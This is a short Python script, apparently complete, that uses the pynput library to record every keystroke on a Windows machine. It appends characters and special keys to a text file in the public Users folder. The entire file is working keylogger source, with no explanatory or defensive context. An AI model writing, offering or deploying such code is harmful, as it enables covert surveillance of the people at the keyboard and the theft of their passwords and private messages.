from pynput import keyboard

log_file = "C:\\Users\\Public\\keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(str(key.char))
        except AttributeError:
            f.write('[' + str(key) + ']')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
